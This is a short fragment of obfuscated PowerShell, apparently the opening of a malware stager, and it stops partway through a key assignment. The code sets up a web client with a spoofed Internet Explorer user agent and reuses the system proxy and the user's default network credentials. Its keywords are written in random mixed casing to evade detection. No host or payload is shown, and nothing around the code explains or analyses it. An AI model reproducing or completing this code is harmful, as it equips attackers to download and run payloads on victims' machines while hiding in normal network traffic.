
$wc=NEW-ObjecT SySTEM.NET.WebCliEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadErS.AdD('User-Agent',$u);$Wc.PRoxY = [SYsteM.NET.WEBReQueSt]::DEFaUltWebProXY;$WC.PROxy.CREdENTiALs = [SYStEM.NeT.CreDeNtIALCaChE]::DEFaUlTNeTworKCREdentiALS;$K='rX<l_

